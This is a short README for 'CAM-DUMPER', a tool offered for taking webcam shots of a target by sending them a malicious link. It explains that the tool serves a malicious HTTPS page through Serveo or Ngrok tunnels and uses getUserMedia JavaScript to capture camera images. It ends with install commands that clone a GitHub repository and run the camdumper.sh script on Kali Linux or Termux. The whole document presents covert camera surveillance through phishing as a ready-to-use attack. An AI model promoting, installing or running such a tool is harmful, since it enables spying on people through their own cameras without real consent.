CAM-DUMPER


Take webcam shots from target by just sending a malicious link

How it works?
The tool generates a malicious HTTPS page using Serveo or Ngrok Port Forwarding methods, and a javascript code to cam requests using MediaDevices.getUserMedia.

The MediaDevices.getUserMedia() method prompts the user for permission to use a media input which produces a MediaStream with tracks containing the requested types of media. That stream can include, for example, a video track (produced by either a hardware or virtual video source such as a camera, video recording device, screen sharing service, and so forth), an audio track (similarly, produced by a physical or virtual audio source like a microphone, A/D converter, or the like), and possibly other track types.

Installing (Kali Linux/Termux):
$ apt update && apt upgrade
$ apt install git php wget curl jq
$ git clone https://github.com/junayedbittu12/Bittu.git
$ cd Bittu
$ chmod +x camdumper.sh
$ ./camdumper.sh
Termux users should install MATERIAL FILES app from playstore for easy managing captured files.
